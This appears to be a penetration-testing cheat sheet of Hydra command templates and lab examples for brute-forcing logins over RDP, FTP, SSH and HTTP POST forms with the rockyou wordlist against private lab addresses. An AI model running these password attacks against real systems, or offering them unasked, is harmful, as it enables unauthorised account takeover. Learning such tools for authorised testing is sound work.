hydra -L <userwordlist> -P <passwordlist> <protocol>://<IP> #With -l or -p it can be passed a single name.


#sudo hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202

#hydra ftp://192.168.207.202 -l itadmin -P /usr/share/wordlists/rockyou.txt 

hydra <IP> -l username -P <passwordlist> <protocol> -s <port>

#hydra 192.168.207.201 -l george -P /usr/share/wordlists/rockyou.txt ssh -s 2222

hydra -L <users_file> -P <password_file> <url> http[s]-[post|get]-form \
"<Path>:<RequestBody>:<IncorrectVerbiage>"

#sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=admin&password=^PASS^:Invalid Password!"

# TO bruteforce a page that requires automatic browser autentication we employ the form http-get (not http-get-form)
#
